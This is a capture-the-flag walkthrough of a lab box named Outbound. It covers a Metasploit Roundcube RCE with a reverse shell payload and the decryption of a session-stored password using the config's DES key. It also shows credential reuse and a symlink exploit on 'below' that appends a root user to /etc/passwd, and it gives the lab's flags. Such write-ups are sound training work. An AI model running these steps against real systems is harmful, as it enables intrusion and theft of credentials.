---
layout: default
title: Outbound
---

## TL;DR

We get `RCE` using known exploit on `Roundcube Webmail`. Then we move to `tyler`, and find inside `config.inc.php` the credentials for local `mysql` server. we decrypt the password of `john` we can find in the server, and then escalate to root using known exploit on `/usr/bin/below`.

### Intro

we're given this info:
```bash
As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2
```
So, the we got the credentials: `tyler / LhKL1o9Nm3X2`

### Recon

we start with `nmap`, using this command:
```bash
nmap -p- -sVC --min-rate=10000 $target
```
![nmap results](image.png)

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

we need to add `mail.outbound.htb` to our `/etc/hosts`, and probably also `outbound.htb`, so let's add:
```bash
10.10.11.77     outbound.htb
10.10.11.77     mail.outbound.htb
```

### Login with given credentials to login portal

I tried to connect with the credentials we got via `ssh` to the user `tyler`, but didn't managed to, probably the credentials are for the login portal at `mail.outbound.htb`.

![failed connect to ssh](image-1.png)

And, after checking, it did worked for the login portal, with this credentials: `tyler / LhKL1o9Nm3X2`

![login using credentials](image-2.png)

### Use metasplit to exploit RCE

After clicking the question mark button, we can view the service and version, which is `Roundcube Webmail 1.6.10`

![version detection](image-3.png)

we google to check if there are some well known vulnerabilities, and immediately find this [https://www.exploit-db.com/exploits/52324](https://www.exploit-db.com/exploits/52324)
there is authenticated `RCE`, and also module for that in `metasploit`, let's use it.

![exploit-db](image-4.png)

Back to our terminal, we first start with:
```bash
msfconsole
```
Then, we want to search for the exploit:
```bash
search Roundcube
```

![search exploit](image-5.png)

Let's use it:
```bash
use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
```

Then, we want to show the options and arguments we need to setup:
```bash
msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > show options

Module options (exploit/multi/http/roundcube_auth_rce_cve_2025_49113):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HOST                        no        The hostname of Roundcube server
   PASSWORD                    yes       Password to login with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5h, sapni, http, socks4, soc
                                         ks5
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of the Roundcube Application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME                    yes       Email User to login with
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen
                                       on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

We need to setup: `RHOSTS`, `RPORT`, `USERNAME`, `PASSWORD`, `LHOST`, `LPORT`.
In addition, we want to use our own payload, to execute a shell, this payload: `payload/linux/x86/shell_reverse_tcp` (can be shown using `show payloads`).

so:
```bash
set RHOSTS mail.outbound.htb
set RPORT 80
set USERNAME tyler 
set PASSWORD LhKL1o9Nm3X2
set LHOST tun0 
set LPORT 4444
set payload payload/linux/x86/shell_reverse_tcp
```

we can verify that everything is correct using `show options`.

![set payloads](image-6.png)

now, just execute `run` to launch the attack.

![achieve shell](image-7.png)

In this case `python` not available in the system, so this is the way we'll get a nice shell:
```bash
SHELL=/bin/bash script -q /dev/null
export TERM=xterm
stty raw -echo
stty rows 38 columns 116
``` 

### Moving to tyler 

We can view the directories inside `/home`, none of them is accessible by us, 
```bash
www-data@mail:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@mail:/$ ls -l /home
total 20
drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 jacob
drwxr-x--- 1 mel   mel   4096 Jun  8 12:06 mel
drwxr-x--- 1 tyler tyler 4096 Jun  8 13:28 tyler
```

We can use `su` and tyler's password, which is `LhKL1o9Nm3X2`, maybe we'll manage to move to another user.
```bash
www-data@mail:/$ su tyler
Password: LhKL1o9Nm3X2

tyler@mail:/$ id
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler)
```

### Moving to jacob

I started with `sudo -l`, and got: `bash: sudo: command not found`.

Then, i execute `linpeas.sh` (download via http server from my local machine)

This interesting thing popup to me:

![execute linpeas.sh](image-8.png)

So, i checked it again:
```php
tyler@mail:/var/www/html/roundcube/config$ cat config.inc.php
<?php
/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

So, i tried to login to `mysql` using username `roundcube` and password `RCDBPass2025`
```bash
tyler@mail:/var/www/html/roundcube/config$ mysql -u roundcube -p 

Enter password: RCDBPass2025

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 341
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

we can find the table `users` inside the database `roundcube`, but there is nothing interesting there:
```sql
MariaDB [roundcube]> select * from roundcube.users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+   
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                       |   
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+   
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";} |   
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";} |   
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-10-21 11:10:15 | 2025-10-21 10:32:34 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";} |   
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+---------------------------------------------------+   
3 rows in set (0.001 sec)
```

we don't have privileges to access `mysql.users`:
```sql
MariaDB [roundcube]> SHOW GRANTS FOR CURRENT_USER();
+------------------------------------------------------------------------------------------------------------------+
| Grants for roundcube@localhost                                                                                   |
+------------------------------------------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO `roundcube`@`localhost` IDENTIFIED BY PASSWORD '*27EDA95EC13D4E0B130D40BF5AC6D460F878E6A8' |
| GRANT ALL PRIVILEGES ON `roundcube`.* TO `roundcube`@`localhost`                                                 |
+------------------------------------------------------------------------------------------------------------------+
2 rows in set (0.000 sec)
```


Let's try to move to another path. We remember these lines from `config.inc.php`:
```php
// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

We will try to fetch the data from `session` table, we can view the columns i this table using `information_schema`:
```sql
select column_name from information_schema.columns where table_name="session";
```
Or simply using `show columns from session;`:
```sql
MariaDB [roundcube]> show columns from session;
+---------+--------------+------+-----+---------------------+-------+
| Field   | Type         | Null | Key | Default             | Extra |
+---------+--------------+------+-----+---------------------+-------+
| sess_id | varchar(128) | NO   | PRI | NULL                |       |
| changed | datetime     | NO   | MUL | 1000-01-01 00:00:00 |       |
| ip      | varchar(40)  | NO   |     | NULL                |       |
| vars    | mediumtext   | NO   |     | NULL                |       |
+---------+--------------+------+-----+---------------------+-------+
4 rows in set (0.001 sec)
```

let's fetch the all data from `session`:
```sql
MariaDB [roundcube]> select * from session;
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)
```

The default cipher method is `DES-EDE3-CBC`:
```bash
tyler@mail:/var/www/html/roundcube/config$ ls
config.inc.php  config.inc.php.sample  defaults.inc.php  mimetypes.php
tyler@mail:/var/www/html/roundcube/config$ cat * | grep cipher               
// in the session record. For the default cipher method it must be
// in the session record. For the default cipher method it must be
//       for Mysql: key, cipher, cert, capath, ca, verify_server_cert,
// with any configured cipher_method (see below).
// For the default cipher_method a required key length is 24 characters.
$config['cipher_method'] = 'DES-EDE3-CBC';
```

Let's first `base64` decode the string we got:
```bash
echo "bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7" | base64 -d
```
We can notice the username `jacob` and the encrypted password `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`

![base64 decode](image-9.png)



Now, we can detect the username and the encrypted password, let's try to decrypt the string `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` using the key `rcmail-!24ByteDESkey*Str`, and the cipher method `DES-EDE3-CBC`.
We can use this website: [https://keydecryptor.com/decryption-tools/roundcube](https://keydecryptor.com/decryption-tools/roundcube)

![decrypt](image-10.png)

the password we decrypted is `595mO8DmwGeD`, so know we have another valid user credentials, `jacob / 595mO8DmwGeD`.

let's `su` to jacob.

![su jacob](image-11.png)

### Find the password for ssh connection to jacob

next, we start navigating in the files of `jacob`.
We can notice there is this file, `/home/jacob/mail/INBOX/jacob`, let's try and read it

```bash
jacob@mail:~/mail/INBOX$ cat jacob

From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

The mail was sent from tyler to jacob, and it says:
```
Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.
```
Let's hope they didn't remember to change the password `gY4Wr3a1evp4` :)

Note, we could have also connect to the webserver, as `jacob`, and then inspect the mail.

![connect as jacob](image-12.png)

They havn't change the password, we can connect to `jacob` using `ssh`, with the password `gY4Wr3a1evp4`:
```bash
ssh jacob@$target
```

![connect using ssh to jacob](image-13.png)

and now finally we got the user flag:
```bash
jacob@outbound:~$ cat user.txt 
37101d56ae4d9ec133befc28b552e86b
```

### Privilege Escalation

when we execute `id` we can notice we are in group `users`, but we cannot find any interesting file related to this group.
```bash
jacob@outbound:/var/log/below$ id 
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
jacob@outbound:/var/log/below$ find / -group users 2>/dev/null
jacob@outbound:/var/log/below$ 
```

next, we try `sudo -l`:
```bash
jacob@outbound:/var/log/below$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

we can see the file `/usr/bin/below` can be executed as `root` user with the `sudo` command, with no password required. 

when we google, for possible privilege escalation, we can find this repo, [https://github.com/00xCanelo/CVE-2025-27591](https://github.com/00xCanelo/CVE-2025-27591)

i just downloaded the exploit, and executed the `exploit.sh`.

```bash
jacob@outbound:/var/log/below$ /tmp/exploit.sh 
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/fakeadmin
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Oct 21 16:26:49.457 DEBG Starting up!
Oct 21 16:26:49.458 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01761004800: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su fakeadmin'...
root@outbound:/var/log/below# cat /root/root.txt
5b69b7cdf2df77f8eb6669b3a68ccbb9
```

And then, we got the root flag `5b69b7cdf2df77f8eb6669b3a68ccbb9`.

![get root flag](image-14.png)

**User Flag:*****`37101d56ae4d9ec133befc28b552e86b`***

**Root Flag:*****`5b69b7cdf2df77f8eb6669b3a68ccbb9`***
